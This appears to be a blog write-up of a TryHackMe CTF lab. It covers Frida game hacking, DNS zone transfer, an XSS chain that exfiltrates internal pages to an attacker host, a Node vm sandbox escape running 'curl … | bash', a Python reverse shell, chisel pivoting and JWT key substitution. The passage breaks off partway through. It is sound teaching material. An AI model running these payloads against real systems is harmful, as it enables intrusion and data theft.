---
title: "TryHackMe: AoC 2024 Side Quest Five"
author: jaxafed
categories: [TryHackMe]
date: 2025-01-01 00:00:05 +0000
tags: [web, frida, game hacking, ghidra, dns, xss, sandbox, rce, chisel, docker, npm, node, git, jwt, sudo]
render_with_liquid: false
media_subpath: /images/tryhackme_aoc2024_sidequest_five/
image:
  path: room_image.webp
---

**Fifth Side Quest** started with hacking a game on **Advent of Cyber Day 19** using **Frida** and reverse-engineering a library it uses to discover the keycard with the password, which we then used to disable the firewall.

After that, we used **zone transfer** to discover a couple of hosts. By abusing an **XSS** vulnerability on one of the hosts, we enumerated an internal web application, which led us to discovering a **Node** package it used. Finding this **Node** package hosted on a private registry within the target allowed us to read its source code and exploit it to gain a shell inside a container.

Inside this container, we discovered a private key that provided access to a **Git** repository with the source code of a web application running in another container. Examining the source code, we noticed it used a public key that we could modify for authentication. This allowed us to sign our tokens to authenticate and gain access to operations like restarting or reinstalling **Node** packages for services. Combining this with our access to the private **Node** registry to hijack a module, we used it to gain a shell in the new container.

Inside this container, we found yet another private key and gained access to a new **Git** repository. This repository included a **Git** hook with a command injection vulnerability. Exploiting this, we were able to gain a shell on the host.

Lastly, using our **sudo** privileges, we escalated to the **root** user on the host and completed the challenge.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/adventofcyber24sidequest){: .center }

## Finding the Keycard

For solving the `Advent of Cyber Day 19` challenge, we use **Frida** to hook into functions called from `libaocgame.so` to hack a game.

Running the program with `frida-trace` to trace all the functions called from `libaocgame.so`, apart from the functions used in the task, we notice one more function: `_Z14create_keycardPKc`.

```console
ubuntu@tryhackme:~/Desktop/TryUnlockMe$ frida-trace ./TryUnlockMe -i 'libaocgame.so!*'
Instrumenting...                                                        
_Z17validate_purchaseiii: Loaded handler at "/home/ubuntu/Desktop/TryUnlockMe/__handlers__/libaocgame.so/_Z17validate_purchaseiii.js"
_Z7set_otpi: Loaded handler at "/home/ubuntu/Desktop/TryUnlockMe/__handlers__/libaocgame.so/_Z7set_otpi.js"
_Z14create_keycardPKc: Auto-generated handler at "/home/ubuntu/Desktop/TryUnlockMe/__handlers__/libaocgame.so/_Z14create_keycardPKc.js"
_Z16check_biometricsPKc: Loaded handler at "/home/ubuntu/Desktop/TryUnlockMe/__handlers__/libaocgame.so/_Z16check_biometricsPKc.js"
Started tracing 4 functions. Web UI available at http://localhost:1337/
```

Also, checking the strings in the executable, we find an interesting string: `UP DOWN LEFT RIGHT DOWN DOWN UP UP RIGHT LEFT`.

```console
ubuntu@tryhackme:~/Desktop/TryUnlockMe$ strings TryUnlockMe
...
Huh... More advice? Maybe don't fall for scams?
I don't know what to say anymore... Here, have your 5 coins back.
UP DOWN LEFT RIGHT DOWN DOWN UP UP RIGHT LEFT
Here you go! 10 coins for you.
Huh, why didn't my coin count update?
...
```

Entering these directions as an input in the game, we see the `_Z14create_keycardPKc` function being called.

![Game Hacking](game_hacking.webp){: width="1200" height="600" }

Modifying the `__handlers__/libaocgame.so/_Z14create_keycardPKc.js` to print the argument passed to the function and its return value:

```js
defineHandler({
  onEnter(log, args, state) {
    log('_Z14create_keycardPKc()');
    log("PARAMETER: " + Memory.readCString(args[0]));
  },

  onLeave(log, retval, state) {
    log("RETVAL: " + retval.toInt32());
  }
});
```

Now, entering the code once more, we see the function is called with `p@szw0rd` as the argument and returns `0`.

![Game Hacking Two](game_hacking2.webp){: width="1200" height="600" }

Since we don't know the password, we can simply try changing the return value:

```js
defineHandler({
  onEnter(log, args, state) {
    log('_Z14create_keycardPKc()');
    log("PARAMETER: " + Memory.readCString(args[0]));
  },

  onLeave(log, retval, state) {
    retval.replace(ptr(1));
  }
});
```

With this modification, we get the password `where_is_the_yeti`, but we still don't have the keycard.

![Game Hacking Three](game_hacking3.webp){: width="1200" height="600" }

To understand what the function does, we can download `/usr/lib/libaocgame.so` for reverse engineering:

```console
ubuntu@tryhackme:/usr/lib$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```console
$ wget http://10.10.111.56:8080/libaocgame.so
```

After downloading it and opening it in **Ghidra**, the `create_keycard` function reveals that it checks if the argument's length is `23 (0x17)` and compares it character by character to `one_two_three_four_five`. If it matches, it opens the `keycard.zip` file and writes data to it after an `XOR` operation with the passed argument.

![Ghidra Decompilation](ghidra_decompilation.webp){: width="800" height="600" }

Knowing this, I first tried replacing the argument passed to the function by modifying the `__handlers__/libaocgame.so/_Z14create_keycardPKc.js` file, but it didn’t work. Then, I wrote a script to call the `create_keycard` function manually with the correct password:

```js
var libraryPath = "/usr/lib/libaocgame.so";
var functionName = "_Z14create_keycardPKc";
var functionAddress = Module.findExportByName(libraryPath, functionName);
console.log("Function address: " + functionAddress);
var createKeycard = new NativeFunction(functionAddress, 'int', ['pointer']);
var stringMemory = Memory.allocUtf8String("one_two_three_four_five");
createKeycard(stringMemory);
console.log("Called create_keycard successfully.");
````
{: file="create_keycard.js" }

Running the game with `frida` and loading this script, we successfully call the `create_keycard` function:

```console
ubuntu@tryhackme:~/Desktop/TryUnlockMe$ frida -f ./TryUnlockMe -l create_keycard.js 
     ____
    / _  |   Frida 16.5.6 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to Local System (id=local)
Spawning `./TryUnlockMe`...                                             
Function address: 0x7f295f4d5309
Called create_keycard successfully.
Spawned `./TryUnlockMe`. Resuming main thread!                          
[Local::TryUnlockMe ]->
```

This creates the `keycard.zip` file:

```console
ubuntu@tryhackme:~/Desktop/TryUnlockMe$ ls
TryUnlockMe  __handlers__  assets  create_keycard.js  keycard.zip
```

Extracting the archive with the password we got before (`where_is_the_yeti`), we find a single file inside named `aoc-sidequest-keycard5.png`:

```console
ubuntu@tryhackme:~/Desktop/TryUnlockMe$ 7z x keycard.zip -pwhere_is_the_yeti
...
ubuntu@tryhackme:~/Desktop/TryUnlockMe$ ls
TryUnlockMe   aoc-sidequest-keycard5.png  create_keycard.js
__handlers__  assets                      keycard.zip
```

Opening `aoc-sidequest-keycard5.png`, we find the keycard with the password `fi[REDACTED]ve`.

![Keycard](keycard.webp){: width="1000" height="600" }

## Side Quest

As usual, we start the side quest by visiting `http://10.10.165.202:21337/` and disabling the firewall using the password from the keycard.

![Web 21337 Index](web_21337_index.webp){: width="1200" height="600"}

### Initial Enumeration

We begin with an `nmap` scan.

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.165.202
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-26 15:07 UTC
Nmap scan report for 10.10.165.202
Host is up (0.098s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 1e:27:10:bd:91:eb:8f:33:5c:83:67:31:55:03:1f:c3 (ECDSA)
|_  256 f2:da:c5:58:78:4b:20:04:47:0c:82:71:06:59:75:92 (ED25519)
53/tcp    open  domain  dnsmasq 2.90
| dns-nsid:
|_  bind.version: dnsmasq-2.90
80/tcp    open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://thehub.bestfestivalcompany.thm
|_http-server-header: Apache/2.4.58 (Ubuntu)
3000/tcp  open  http    Node.js Express framework
|_http-title: Did not follow redirect to http://thehub.bestfestivalcompany.thm
21337/tcp open  unknown
...
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are four relevant ports open:

- **22** (`SSH`)
- **53** (`DNS`)
- **80** (`HTTP`)
- **3000** (`HTTP`)

Also from the scan, we observe that the HTTP servers redirect to `http://thehub.bestfestivalcompany.thm`, so adding `thehub.bestfestivalcompany.thm` and `bestfestivalcompany.thm` to our hosts file:

```console
10.10.165.202 thehub.bestfestivalcompany.thm bestfestivalcompany.thm
```

Trying a **zone transfer** for the `bestfestivalcompany.thm` domain using the `DNS` service, we get a lot more hosts.

```console
$ dig axfr bestfestivalcompany.thm @10.10.165.202

; <<>> DiG 9.19.21-1+b1-Debian <<>> axfr bestfestivalcompany.thm @10.10.165.202
;; global options: +cmd
bestfestivalcompany.thm. 600    IN      SOA     bestfestivalcompany.thm. hostmaster.bestfestivalcompany.thm. 1735226101 1200 180 1209600 600
bestfestivalcompany.thm. 600    IN      NS      bestfestivalcompany.thm.
bestfestivalcompany.thm. 600    IN      NS      0.0.0.0/0.
thehub-uat.bestfestivalcompany.thm. 600 IN A    172.16.1.3
thehub.bestfestivalcompany.thm. 600 IN  A       172.16.1.3
thehub-int.bestfestivalcompany.thm. 600 IN A    172.16.1.3
npm-registry.bestfestivalcompany.thm. 600 IN A  172.16.1.2
adm-int.bestfestivalcompany.thm. 600 IN A       172.16.1.2
bestfestivalcompany.thm. 600    IN      SOA     bestfestivalcompany.thm. hostmaster.bestfestivalcompany.thm. 1735226101 1200 180 1209600 600
;; Query time: 108 msec
;; SERVER: 10.10.165.202#53(10.10.165.202) (TCP)
;; WHEN: Thu Dec 26 15:17:22 UTC 2024
;; XFR size: 9 records (messages 1, bytes 457)
```
{: .wrap }

Also adding them to our hosts file.

```console
10.10.165.202 thehub.bestfestivalcompany.thm bestfestivalcompany.thm hostmaster.bestfestivalcompany.thm thehub-uat.bestfestivalcompany.thm thehub-int.bestfestivalcompany.thm npm-registry.bestfestivalcompany.thm adm-int.bestfestivalcompany.thm
```
{: file="/etc/hosts" .wrap }

Visiting the HTTP server with the hostnames we have, there are four main sites:

- `http://thehub.bestfestivalcompany.thm/`: Where we basically get an "under construction" message.

![Web Thehub Index](web_thehub_index.webp){: width="1200" height="600"}

- `http://thehub-uat.bestfestivalcompany.thm/`: Which redirects to `http://thehub-uat.bestfestivalcompany.thm:3000/`, and there we see a contact form.

![Web Thehubuat Index](web_thehubuat_index.webp){: width="1200" height="600"}

- `http://thehub-int.bestfestivalcompany.thm/`: Where we see a login form.

![Web Thehubint Index](web_thehubint_index.webp){: width="1200" height="600"}

- `http://npm-registry.bestfestivalcompany.thm/`: Where we find a `Verdaccio` installation, which is basically a private `Node.js` registry.

![Web Npmregistry Index](web_npmregistry_index.webp){: width="1200" height="600"}

### First Flag

Testing the contact form at `http://thehub-uat.bestfestivalcompany.thm:3000/` with an `XSS` payload like `<script src="http://10.11.72.22/xss.js"></script>`, we observe that it is vulnerable as we get a hit for `xss.js` on our web server.

![Web Thehubuat Xss](web_thehubuat_xss.webp){: width="1200" height="600" }

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.165.202 - - [26/Dec/2024 15:29:04] code 404, message File not found
10.10.165.202 - - [26/Dec/2024 15:29:04] "GET /xss.js HTTP/1.1" 404 -
```

While it is not possible to steal the cookies, we can still use this `XSS` vulnerability to enumerate the web server where our `XSS` payload runs by using a payload to fetch pages and send the responses back to us.

Creating the `xss.js` file with such a payload and starting our enumeration with the index.

```js
async function exfil() {
        const response = await fetch('/');
        const text = await response.text();
        await fetch(`http://10.11.72.22/?data=${btoa(text)}`);
}

exfil();
```
{: file="xss.js" }

As we can see, the next time our script is fetched, it is followed by a request that includes the response for the request to the index, **base64** encoded.

```console
10.10.165.202 - - [26/Dec/2024 15:37:03] "GET /xss.js HTTP/1.1" 200 -
10.10.165.202 - - [26/Dec/2024 15:37:04] "GET /?data=PCFE...sPgo= HTTP/1.1" 200 -
```

Decoding the response we got from **base64**, we see links for two new endpoints: `/contact-responses` and `/wiki`.

```html
<div class="contact-responses">
    <a href="/contact-responses" class="inside btn-enlarge">
        ...
        <p class="" >View Contact Us Responses</p>
    </a>
</div>
<div class="wiki ">
    <a href="/wiki" class="inside btn-enlarge">
        ...
        <p class="">Go to Wiki</p>
    </a>
</div>
```

`/contact-responses` is probably where our message is displayed, so let's start by enumerating the `/wiki` endpoint by changing the payload in the `xss.js` file as follows:

```js
async function exfil() {
        const response = await fetch('/wiki');
        const text = await response.text();
        await fetch(`http://10.11.72.22/?data=${btoa(text)}`);
}

exfil();
```
{: file="xss.js" }

```console
10.10.165.202 - - [26/Dec/2024 15:41:04] "GET /xss.js HTTP/1.1" 200 -
10.10.165.202 - - [26/Dec/2024 15:41:04] "GET /?data=PCFE...KCgo= HTTP/1.1" 200 -
```

Decoding the response we got for the `/wiki` endpoint, we get yet another endpoint: `/wiki/new`.

```html
...
    <a class="btn-enlarge" href="/wiki/new">Create New WIKI</a>
...
```

Once again, we modify our payload to fetch this new endpoint:

```js
async function exfil() {
        const response = await fetch('/wiki/new');
        const text = await response.text();
        await fetch(`http://10.11.72.22/?data=${btoa(text)}`);
}

exfil();
```
{: file="xss.js" }

```console
10.10.165.202 - - [26/Dec/2024 15:43:03] "GET /xss.js HTTP/1.1" 200 -
10.10.165.202 - - [26/Dec/2024 15:43:04] "GET /?data=PCFE...sPgo= HTTP/1.1" 200 -
```

Decoding the response we get for the `/wiki/new` endpoint, we see a form that sends data to the `/wiki` endpoint with a `POST` request, including the `title` and `markdownContent` parameters.

```html
...
    <form action="/wiki" method="POST">
      <label>Title</label>
      <input type="text" name="title" required>
      <label>Content (Markdown)</label>
      <textarea name="markdownContent" required></textarea>
      <button type="submit">Create</button>
    </form>
...
```

Next, we modify our payload to make a `POST` request to the `/wiki` endpoint with no parameters:

```js
async function exfil() {
        const response = await fetch('/wiki', {
            method: "POST"
        });
        const text = await response.text();
        await fetch(`http://10.11.72.22/?data=${btoa(text)}`);
}

exfil();
```
{: file="xss.js" }

```console
10.10.165.202 - - [26/Dec/2024 15:47:02] "GET /xss.js HTTP/1.1" 200 -
10.10.165.202 - - [26/Dec/2024 15:47:03] "GET /?data=PCFE...sPgo= HTTP/1.1" 200 -
```

Now, decoding the response for the `POST` request to the `/wiki` endpoint, we see an interesting error:

```html
<pre>TypeError: Cannot read properties of undefined (reading 'replace')<br>    at markdownToHtml (/app/bfc_thehubint/node_modules/markdown-converter/index.js:5:6)<br>    at /app/bfc_thehubint/index.js:175:23<br>    at Layer.handle [as handle_request] (/app/bfc_thehubint/node_modules/express/lib/router/layer.js:95:5)<br>    at next (/app/bfc_thehubint/node_modules/express/lib/router/route.js:149:13)<br>    at requireLogin (/app/bfc_thehubint/index.js:97:3)<br>    at Layer.handle [as handle_request] (/app/bfc_thehubint/node_modules/express/lib/router/layer.js:95:5)<br>    at next (/app/bfc_thehubint/node_modules/express/lib/router/route.js:149:13)<br>    at Route.dispatch (/app/bfc_thehubint/node_modules/express/lib/router/route.js:119:3)<br>    at Layer.handle [as handle_request] (/app/bfc_thehubint/node_modules/express/lib/router/layer.js:95:5)<br>    at /app/bfc_thehubint/node_modules/express/lib/router/index.js:284:15</pre>
```
{: .wrap }

We can see the error is coming from the `markdown-converter` module, and luckily for us, we find this module in the `Node.js` registry at `http://npm-registry.bestfestivalcompany.thm/-/web/detail/markdown-converter` and can download its source code.

![Web Npmregistry Markdown Converter](web_npmregistry_markdown_converter.webp){: width="1200" height="600"}

After extracting the downloaded archive and checking the `package/index.js`, we see there is one exported function from the module called `markdownToHtml`.

```js
const vm = require('vm');

function markdownToHtml(markdown, context = {}) {
  let html = markdown
    .replace(/^# (.*$)/gim, '<h1>$1</h1>')
    .replace(/^## (.*$)/gim, '<h2>$1</h2>')
    .replace(/^### (.*$)/gim, '<h3>$1</h3>')
    .replace(/^\* (.*$)/gim, '<li>$1</li>')
    .replace(/\*\*(.*)\*\*/gim, '<b>$1</b>')
    .replace(/\*(.*)\*/gim, '<i>$1</i>');

  const dynamicCodeRegex = /\{\{(.*?)\}\}/g;
  html = html.replace(dynamicCodeRegex, (_, code) => {
    try {
      const sandbox = {
        ...context,
        require,
      };
      return vm.runInNewContext(code, sandbox);
    } catch (error) {
      return `<span style="color:red;">Error: ${error.message}</span>`;
    }
  });

  return html;
}

module.exports = { markdownToHtml };
```

Examining the function, first, it replaces some of the markdown syntax with HTML syntax in the passed argument.

The second part is more interesting: it extracts any string between `{{ ... }}` as `code` and runs it in a sandboxed context using the `vm` module, replacing the `{{ ... }}` part with the output of the command—kind of like a templating engine.

Going back to the error we get, it seems whatever is passed in the `markdownContent` parameter in a `POST` request to the `/wiki` endpoint is converted to HTML using this function. Since we did not pass anything, the `markdown` argument being passed to the function was `undefined`, which caused the error.

Looking for recent sandbox escape payloads for the `vm` module, we find one [here](https://gist.github.com/leesh3288/e4aa7b90417b0b0ac7bcd5b09ac7d3bd).

We can modify our `XSS` payload in the `xss.js` file with the payload we have found to achieve remote code execution as follows:

```js
async function rce() {
    const formData = new URLSearchParams();
    formData.append('title', 'jxf');
    formData.append('markdownContent', "{{WebAssembly.compileStreaming({[Symbol.for('nodejs.util.inspect.custom')]: (depth, opt, inspect) => {inspect.constructor('return process')().mainModule.require('child_process').execSync('curl 10.11.72.22|bash')}, valueOf: undefined, constructor: undefined}).catch(()=>{})}}");
    const response = await fetch('/wiki', {
        method: "POST",
        headers: {
           'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: formData.toString()
    });
}

rce();
```
{: file="xss.js" }

Also, we create and host our reverse shell payload, which will be downloaded and run by our `XSS` payload:

```console
$ cat index.html
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.72.22",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
{: .wrap }

Now, we can see our `xss.js` file fetched first, followed by our reverse shell payload right after:

```console
10.10.165.202 - - [26/Dec/2024 16:10:03] "GET /xss.js HTTP/1.1" 200 -
10.10.165.202 - - [26/Dec/2024 16:10:03] "GET / HTTP/1.1" 200 -
```

With this, we also get a shell in our listener as `root` inside a container.

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.165.202] 46848
/app/bfc_thehubint # python3 -c 'import pty;pty.spawn("/bin/bash");'
9e0b831d786c:/app/bfc_thehubint# export TERM=xterm
9e0b831d786c:/app/bfc_thehubint# ^Z
zsh: suspended  nc -lvnp 443

$ stty raw -echo; fg

9e0b831d786c:/app/bfc_thehubint# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
9e0b831d786c:/app/bfc_thehubint#
```

Lastly, we can read the first flag at `/flag-be64845bf0c553d7ec378aa54a6c3bfe.txt`.

```console
9e0b831d786c:/app/bfc_thehubint# wc -c /flag-be64845bf0c553d7ec378aa54a6c3bfe.txt
38 /flag-be64845bf0c553d7ec378aa54a6c3bfe.txt
```

### Second Flag

Starting with enumerating the file system, we find two important things:

- First, inside the `/root/.npmrc`, we get an auth token for the `Node.js` registry.

```console
9e0b831d786c:~# cat .npmrc
//npm-registry.bestfestivalcompany.thm:4873/:_authToken=OWI1MmY3MzA0MDEyZmVkYTIwMzdjMTZmZDhjZjA1ZmQ6OGJiNjQxM2Y0NDYzZDZiMGRiMWI2NGY2ZjhkOWU2OWJlNTk0M2VkNzg5OTU5NDM2NjkyMDdm
registry=http://npm-registry.bestfestivalcompany.thm:4873/
```
- Second, we find a `Git` repository at `/app/bfc_thehubuat/assets/`.

```console
9e0b831d786c:~# ls -la /app/bfc_thehubuat/assets/
total 36
drwxr-xr-x    5 root     root          4096 Dec 16 17:07 .
drwxr-xr-x    1 root     root          4096 Dec 18 19:46 ..
drwxr-xr-x    7 root     root          4096 Dec 16 17:22 .git
drwxr-xr-x    2 root     root          4096 Dec 16 17:02 backups
drwxr-xr-x    2 root     root          4096 Dec 12 13:55 cache
-rw-rw-r--    1 root     root           486 Dec 16 17:02 jwks.json
-rw-r--r--    1 root     root           216 Dec 16 17:02 package.json
-rw-r--r--    1 root     root            38 Dec 16 17:02 robots.txt
```

Next, enumerating the network by uploading a static `nmap` binary to the host and scanning the `172.16.1.0/24` network for other hosts, since our container has the IP address of `172.16.1.3`.

```console
9e0b831d786c:~# wget 10.11.72.22/nmap
9e0b831d786c:~# chmod +x nmap
9e0b831d786c:~# ./nmap -sn 172.16.1.0/24
...
Nmap scan report for 172.16.1.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000035s latency).
MAC Address: 02:42:96:10:EF:DB (Unknown)
Nmap scan report for npm-registry.bestfestivalcompany.thm (172.16.1.2)
Host is up (0.000050s latency).
MAC Address: 02:42:AC:10:01:02 (Unknown)
Nmap scan report for 9e0b831d786c (172.16.1.3)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 16.75 seconds
```

There are three hosts: the host at `172.16.1.1`, another container at `172.16.1.2` (from the hostname, it seems to be the one hosting the `Node.js` registry), and our container at `172.16.1.3`.

While we don't find anything unusual at the host, scanning the other container for open ports, apart from the `Verdaccio` on port `4873`, we see two other web servers at ports `3000` and `5000`.

```console
9e0b831d786c:~# ./nmap -p- -T5 172.16.1.2
...
Host is up (0.000028s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  unknown
4873/tcp open  unknown
5000/tcp open  unknown
MAC Address: 02:42:AC:10:01:02 (Unknown)
```

Let's also upload `chisel` to the container and establish a `SOCKS` proxy, so we can connect to these services directly.

```console
$ chisel server -p 7777 --reverse --socks5
```

```console
9e0b831d786c:~# wget 10.11.72.22/chisel
9e0b831d786c:~# chmod +x chisel
9e0b831d786c:~# ./chisel client 10.11.72.22:7777 R:socks &
```

Also setting up `Burp` to use the `SOCKS` proxy.

![Burp Socks Proxy](burp_socks_proxy.webp){: width="900" height="400"}

Now, visiting `http://172.16.1.2:3000/`, we see there is no handler set for the index.

![Web 3000 Index](web_3000_index.webp){: width="1200" height="600"}

And visiting `http://172.16.1.2:5000/`, we get an "under construction" message.

![Web 5000 Index](web_5000_index.webp){: width="1200" height="600"}

Since we did not get anything from the web servers yet, let's go back to the **Git** repository we found in the `/app/bfc_thehubuat/assets/`.

Due to `git` not being installed in the container, let's archive the `assets` directory and transfer it to our machine.

```console
9e0b831d786c:/app/bfc_thehubuat# tar -czf assets.tar.gz assets
9e0b831d786c:/app/bfc_thehubuat# mv assets.tar.gz assets
```

```console
$ wget http://thehub-uat.bestfestivalcompany.thm:3000/assets.tar.gz
$ tar -xzf assets.tar.gz
$ cd assets
```

Checking the **Git** logs, we see three commits made:

```console
$ git log
commit 2db2f203e26ab1ce4e43d58576f56bf8f6567d8c (HEAD -> main, origin/main)
Author: bfc_admin <bfc_admin@bestfestivalcompany.thm>
Date:   Tue Dec 17 01:01:09 2024 +0800

    Uploaded asset requirements

commit 0b8f682a01ca115073d8f25c20c24d25e6f28c13
Author: bfc_admin <bfc_admin@bestfestivalcompany.thm>
Date:   Tue Dec 17 00:58:22 2024 +0800

    Fixed issues on the backup directory

commit aab6d70d2e79f0a99d960008bfa818d1e0fa3a60
Author: bfc_admin <bfc_admin@bestfestivalcompany.thm>
Date:   Tue Dec 17 00:55:46 2024 +0800

    Squashed commit of UAT v1
```

Checking the first commit, we find a private key at `assets/backups/backup.key` and a username as `git` from the public key.

```console
$ git checkout aab6d70d2e79f0a99d960008bfa818d1e0fa3a60
$ ls -la assets/backups/backup.key
-rw-rw-r-- 1 kali kali 3369 Dec 26 17:03 assets/backups/backup.key

$ cat assets/backups/backup.key.pub
ssh-rsa AAAA...3CfQ== git
```

Trying to use this private key to connect to the `SSH` service on the host as the `git` user, instead of a shell, we get the output from the `gitolite3` program.

```console
$ ssh -i backup.key git@bestfestivalcompany.thm
PTY allocation request failed on channel 0
hello backup, this is git@tryhackme-2404 running gitolite3 3.6.12-1 (Debian) on git 2.43.0

 R      admdev
 R      admint
 R      bfcthehubint
 R      bfcthehubuat
 R      underconstruction
Connection to bestfestivalcompany.thm closed.
```

There are two interesting repositories: `admdev` and `admint`. Since we have read access to them, we can clone them as follows:

```console
$ GIT_SSH_COMMAND="ssh -i backup.key" git clone git@bestfestivalcompany.thm:admdev.git
$ GIT_SSH_COMMAND="ssh -i backup.key" git clone git@bestfestivalcompany.thm:admint.git
```

Checking the `admdev` repository, it seems like the source code for the web server running on `http://172.16.1.2:5000/`.

```js
const express = require('express');

const app = express();
const PORT = 5000;

app.get('/', (req, res) => {
  res.send('Under Construction');
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
```
{: file="admdev/index.js" }

And checking the `admint` repository, we find the source code for the web application running on `http://172.16.1.2:3000/` as follows:

```js
const express = require('express');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const axios = require('axios');
const RemoteManager = require('bfcadmin-remote-manager');
const fs = require('fs');
const { JWK } = require('node-jose');

const app = express();
const PORT = 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

let JWKS = null;

// Fetch JWKS
async function fetchJWKS() {
  try {
    console.log('Fetching JWKS...');
    const response = await axios.get('http://thehub-uat.bestfestivalcompany.thm:3000/jwks.json');
    const fetchedJWKS = response.data;

    if (validateJWKS(fetchedJWKS)) {
      JWKS = fetchedJWKS;
      console.log('JWKS validated and updated successfully.');
    } else {
      console.error('Invalid JWKS structure. Retaining the previous JWKS.');
    }
  } catch (error) {
    console.error('Failed to fetch JWKS:', error.message);
  }
}

// Validate JWKS
function validateJWKS(jwks) {
  if (!jwks || !Array.isArray(jwks.keys) || jwks.keys.length === 0) {
    return false;
  }

  for (const key of jwks.keys) {
    if (!key.kid || (!key.x5c && (!key.n || !key.e))) {
      return false;
    }
  }
  return true;
}

// Periodically fetch JWKS every 1 minute
setInterval(fetchJWKS, 60 * 1000);
fetchJWKS();

// Middleware to ensure JWKS is loaded
function ensureJWKSLoaded(req, res, next) {
  if (!JWKS || !JWKS.keys || JWKS.keys.length === 0) {
    return res.status(503).json({ error: 'JWKS not available. Please try again later.' });
  }
  next();
}

// Middleware to authenticate JWT
async function authenticateToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });

  try {
    const key = JWKS.keys[0];
    let publicKey;

    if (key?.x5c) {
      publicKey = `-----BEGIN CERTIFICATE-----\n${key.x5c[0]}\n-----END CERTIFICATE-----`;
    } else if (key?.n && key?.e) {
      const rsaKey = await JWK.asKey({
        kty: key.kty,
        n: key.n,
        e: key.e,
      });
      publicKey = rsaKey.toPEM();
    } else {
      return res.status(500).json({ error: 'Public key not found in JWKS.' });
    }

    jwt.verify(token, publicKey, { algorithms: ['RS256'] }, (err, user) => {
      if (err || user.username !== 'mcskidy-adm') {
        return res.status(403).json({ error: 'Forbidden' });
      }
      req.user = user;
      next();
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to authenticate token.', details: error.message });
  }
}

// SSH configuration
const sshConfig = {
  host: '', // Supplied by the user in API requests
  port: 22,
  username: 'root',
  privateKey: fs.readFileSync('./root.key'),
  readyTimeout: 5000,
  strictVendor: false,
  tryKeyboard: true,
};

// Restart service
app.post('/restart-service', ensureJWKSLoaded, authenticateToken, async (req, res) => {
  const { host, service } = req.body;
  if (!host || !service) {
    return res.status(400).json({ error: 'Missing host or serviceName value.' });
  }

  try {
    const manager = new RemoteManager({ ...sshConfig, host });
    const output = await manager.restartService(service);
    res.json({ message: `Service ${service} restarted successfully`, output });
  } catch (error) {
    res.status(500).json({ error: 'Failed to restart service', details: error.message });
  }
});

// Modify resolv.conf
app.post('/modify-resolv', ensureJWKSLoaded, authenticateToken, async (req, res) => {
  const { host, nameserver } = req.body;
  if (!host || !nameserver) {
    return res.status(400).json({ error: 'Missing host or nameserver value.' });
  }

  try {
    const manager = new RemoteManager({ ...sshConfig, host });
    const output = await manager.modifyResolvConf(nameserver);
    res.json({ message: 'resolv.conf updated successfully', output });
  } catch (error) {
    res.status(500).json({ error: 'Failed to modify resolv.conf', details: error.message });
  }
});

// Reinstall Node.js modules
app.post('/reinstall-node-modules', ensureJWKSLoaded, authenticateToken, async (req, res) => {
  const { host, service } = req.body;
  if (!host || !service) {
    return res.status(400).json({ error: 'Missing host or service value.' });
  }

  try {
    const manager = new RemoteManager({ ...sshConfig, host });
    const output = await manager.reinstallNodeModules(service);
    res.json({ message: `Node modules reinstalled successfully for service ${service}`, output });
  } catch (error) {
    res.status(500).json({ error: 'Failed to reinstall node modules', details: error.message });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
```
{: file="admint/index.js" }

The server is fairly simple, with three endpoints:

- `/restart-service`: Allows us to restart a service.
- `/modify-resolv`: Allows us to modify the `resolv.conf` file on a host.
- `/reinstall-node-modules`: Allows us to reinstall `Node.js` modules for a service.

Sadly, we don't have access to the source code for the `bfcadmin-remote-manager` module, so we can't be sure how it works exactly. But from the source code, it seems to use `SSH` with the `root.key` to connect to a user-supplied host and perform the requested operation.

Also, all the endpoints mentioned require us to be authenticated, which brings us to the second part of the application.

It uses the public key fetched from `http://thehub-uat.bestfestivalcompany.thm:3000/jwks.json` to validate the **JWT** for authentication, which we can find at `/app/bfc_thehubuat/assets/jwks.json` in the container where we have a shell. If the signed **JWT** is valid and includes `mcskidy-adm` as the username, it authenticates the user successfully.

Currently, we are not authenticated, as we haven't supplied a **JWT**.

![Web 3000 Unauthorized](web_3000_unauthorized.webp){: width="1000" height="500"}

But we can change this. Since it uses a public key we can control to verify the **JWT**, we can modify the `e` and `n` values in the `/app/bfc_thehubuat/assets/jwks.json` file with another public key's values for which we have the private key. First, we can use the `JWT Editor` extension with `Burp` to create a private key and replace those values.

![Burp Create Private Key](burp_create_private_key.webp){: width="500" height="500" }

```console
